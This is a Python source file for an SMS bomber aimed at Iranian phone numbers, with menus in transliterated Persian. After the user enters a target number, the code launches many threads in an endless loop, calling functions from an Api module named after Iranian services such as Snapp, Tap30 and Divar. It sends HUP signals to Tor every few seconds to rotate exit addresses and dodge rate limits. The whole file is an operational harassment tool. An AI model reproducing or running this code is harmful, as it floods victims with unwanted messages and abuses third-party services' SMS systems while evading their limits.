#coded by FarYAS & codibyte & ZProGrammer
from os import system
from os import name
from time import sleep
from time import time
from requests import post
from threading import Thread
from re import search
from datetime import datetime
import Api

def print_slow(txt):
    for x in txt:                     # cycle through the text one character at a time
        print(x, end='', flush=True)  # print one character, no new line, flush buffer
        sleep(0.1)
    print() # go to new line
print('''
\033[92m +FarYAS-----------------ZProGrammer---------------codibyte+             
\033[94m         Coded By FarYAS & codibyte & ZProGrammer              
\033[92m +FarYAS-----------------ZProGrammer---------------codibyte+''')
print_slow('\033[94m         Coded By FarYAS & codibyte & ZProGrammer')
print('''\033[92m +FarYAS-----------------ZProGrammer---------------codibyte+\033[97m''')

proxy = {"https":"127.0.0.1:8000"}

try:
    post('https://google.com', proxies=proxy)
except:
    print('\033[0;31m[!]Error!\n\033[0;31m[!](1 eshtebah rokh dade)tor ro ba dastor badi ejra konid : \033[0;94mtor HTTPTunnelPort 8000')
    exit(0)

license8 = 'FarYAS & codibyte & ZProGrammer'
license16 = 'FarYAS & codibyte & ZProGrammer'

def banner():
    system('clear')
    print("""
+-----------------------------FarYAS & codibyte & ZProGrammer-----------------------------+')
                          Coded By FarYAS & codibyte & ZProGrammer
+-----------------------------FarYAS & codibyte & ZProGrammer-----------------------------+')
    """)

def Dev():
    system("clear")
    print("""\033[0;35m
+-----------------------------FarYAS & codibyte & ZProGrammer-----------------------------+')
                          Coded By FarYAS & codibyte & ZProGrammer
+-----------------------------FarYAS & codibyte & ZProGrammer-----------------------------+')

\033[0;94m
    
    
    [\033[1;94m0\033[1;94m] bargasht
    """)
    now = datetime.now()
    timee = now.strftime("%H:%M:%S")
    goto = input(f'\033[0;36m[{timee}]\033[1;94m >>> ')
    if goto == '0':
        main()

def getnumber():
    try:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        global phone
        phone = str(input(f"\033[0;36m[{timee}]\033[0;94mshomare hadaf ra ba +98 vard  konid (+98xxx): \033[1;31m"))
    except KeyboardInterrupt:
        system('clear')
        print('abzar motevaghef shod')
        system('pkill python')
        system('pkill tor')

def getmood():
    print("""
       
        \033[0;94m[\033[1;33m1\033[0;94m] zaief
        
        \033[0;92m[FarYAS & codibyte & ZProGrammer]
        
        \033[0;91m[\033[1;33m2\033[0;91m] motevaset neyazmand license
       
        \033[0;92m[FarYAS & codibyte & ZProGrammer]
       
        \033[0;94m[\033[1;33m3\033[0;94m] kheyli ghavi neyazmand license
      
        \033[0;92m[FarYAS & codibyte & ZProGrammer]
     
        \033[0;91m[\033[1;33m0\033[0;91m] bargasht

    """)
    try:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        global mood
        mood = input(f'\033[0;36m[{timee}]\033[0;94mnoe ra entekhab konid>>> \033[1;31m')
        # print(int(mood))
    except KeyboardInterrupt:
        system('clear')
        print('abzar motevaghef shod')
        system('pkill python')
        system('pkill tor')

def getlicense():
    try:
        now = datetime.now()
        timee = now.strftime("%H:%M:%S")
        global licensecode
        licensecode = input(f'\033[0;36m[{timee}]\033[0;94mlicense khod ra vard konid: \033[1;32m')
    except KeyboardInterrupt:
        system('clear')
        print('abzar motevaghef shod')
        system('pkill python')
        system('pkill tor')

def mainmenu():
    print("""
        \033[0;94m[\033[1;33m1\033[0;94m] sms bomber
       
        \033[0;92m[FarYAS & codibyte & ZProGrammer]
      
        \033[0;91m[\033[1;33m2\033[0;91m] sazande
       
        \033[0;92m[FarYAS & codibyte & ZProGrammer]
       
        \033[0;94m[\033[1;33m0\033[0;94m] khorog
    """)
    now = datetime.now()
    timee = now.strftime("%H:%M:%S")
    global goto
    goto = input(f"\033[0;36m[{timee}]\033[0;94m>>> ")

def bombing():
    banner()
    getmood()
    while True:
        try:
            now = datetime.now()
            timee = now.strftime("%H:%M:%S")
            global mood
            mood = int(mood)
            if mood < 0 or mood > 3:
                print(f'\033[0;36m[{timee}]\033[0;31m[\033[1;33m!\033[0;31m]entekhab kon 1 v 2 v 3 v 0 ya bargashtan')
                getmood()
            else:
                break
        except KeyboardInterrupt:
            system('clear')
            print('abzar motevaghef shod')
            system('pkill python')
            system('pkill tor')
        except:
            now = datetime.now()
            timee = now.strftime("%H:%M:%S")
            print(f'\033[0;36m[{timee}]\033[0;31m[\033[1;33m!\033[0;31m]lotafan enthkab kon [1-4] !')
            getmood()
    if mood != 0:
        getnumber()
        while True:
            if search('^\+989\d{9}$', phone) == None:
                now = datetime.now()
                timee = now.strftime("%H:%M:%S")
                print(f'\033[0;36m[{timee}]\033[0;31m[\033[1;33m!\033[0;31m]yek shomare ghabel ghabol vard kon!')
                getnumber()
            else:
                break
    
    if mood == 1:
        try:
            global start
            start = time()
            while True:
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                system("killall -HUP tor")
                sleep(3)
        except KeyboardInterrupt:
            system('clear')
            print(f'\033[92m {Api.count} SMS ersal shod dar {time() - start} sanie')
            print('\033[92m abzar motevaghef shod')
            system('pkill python')
            system('pkill tor')
    elif mood == 2:
        getlicense()
        while True:
            if licensecode != license8:
                print(f'\033[0;36m[{timee}]\033[0;32m[\033[1;33m!\033[0;32m]licens shoma ghabel ghabol nist!')
                getlicense()
            elif licensecode == 'FarYAS & codibyte & ZProGrammer':
                break
        # global start
        start = time()
        try:
            while True:
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                system("killall -HUP tor")
                sleep(3)
        except KeyboardInterrupt:
            system('clear')
            print(f'\033[92m {Api.count} SMS ersal shod dar {time() - start} sanie')
            print('\033[92m abzar motevaghef shod')
            system('pkill python')
            system('pkill tor')
    elif mood == 3:
        getlicense()
        while True:
            if licensecode != license16:
                print(f'\033[0;36m[{timee}]\033[0;31m[\033[1;33m!\033[0;31m]license eshtebah ast!')
                getlicense()
            elif licensecode == 'FarYAS & codibyte & ZProGrammer':
                break
        # global start
        start = time()
        try:
            while True:
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.bama, args=[phone]).start()
                Thread(target=Api.snapfood, args=[phone]).start()
                Thread(target=Api.sheypoor, args=[phone]).start()
                Thread(target=Api.alibaba, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.bama, args=[phone]).start()
                Thread(target=Api.snapfood, args=[phone]).start()
                Thread(target=Api.sheypoor, args=[phone]).start()
                Thread(target=Api.alibaba, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
#                Thread(target=Api.gapfilm, args=[phone]).start()
#                Thread(target=Api.hamrahkart, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
                Thread(target=Api.arka, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.bama, args=[phone]).start()
                Thread(target=Api.snapfood, args=[phone]).start()
                Thread(target=Api.sheypoor, args=[phone]).start()
                Thread(target=Api.alibaba, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.bama, args=[phone]).start()
                Thread(target=Api.snapfood, args=[phone]).start()
                Thread(target=Api.sheypoor, args=[phone]).start()
                Thread(target=Api.alibaba, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
                Thread(target=Api.arka, args=[phone]).start()
                Thread(target=Api.sTrip, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.bama, args=[phone]).start()
                Thread(target=Api.snapfood, args=[phone]).start()
                Thread(target=Api.sheypoor, args=[phone]).start()
                Thread(target=Api.alibaba, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
                Thread(target=Api.arka, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.bama, args=[phone]).start()
                Thread(target=Api.snapfood, args=[phone]).start()
                Thread(target=Api.sheypoor, args=[phone]).start()
                Thread(target=Api.alibaba, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                Thread(target=Api.gap, args=[phone]).start()
                Thread(target=Api.tap30, args=[phone]).start()
                Thread(target=Api.emtiaz, args=[phone]).start()
                Thread(target=Api.divar, args=[phone]).start()
                Thread(target=Api.rubika, args=[phone]).start()
                Thread(target=Api.torob, args=[phone]).start()
                Thread(target=Api.bama, args=[phone]).start()
                Thread(target=Api.snapfood, args=[phone]).start()
                Thread(target=Api.sheypoor, args=[phone]).start()
                Thread(target=Api.alibaba, args=[phone]).start()
                Thread(target=Api.smarket, args=[phone]).start()
                Thread(target=Api.arka, args=[phone]).start()
                Thread(target=Api.sTrip, args=[phone]).start()
                Thread(target=Api.snap, args=[phone]).start()
                Thread(target=Api.shad, args=[phone]).start()
                system("killall -HUP tor")
                sleep(3)
        except KeyboardInterrupt:
            system('clear')
            print(f'\033[92m {Api.count} SMS ersal shod dar {time() - start} sanie')
            print('\033[92m abzar motevaghef shod')
            system('pkill python')
            system('pkill tor')
    elif mood == 0:
        main()

def main():
    banner()
    mainmenu()
    if goto == '1':
        bombing()
    elif goto == '2':
        Dev()
    elif goto == '0':
        exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        system('clear')
        try:
            print(f'\033[92m {Api.count} SMS ersal shod dar {time() - start} sanie')
        except:
            pass
        print('\033[92m abzar motevaghef shod')
        system('pkill python')
        system('pkill tor')
        
    
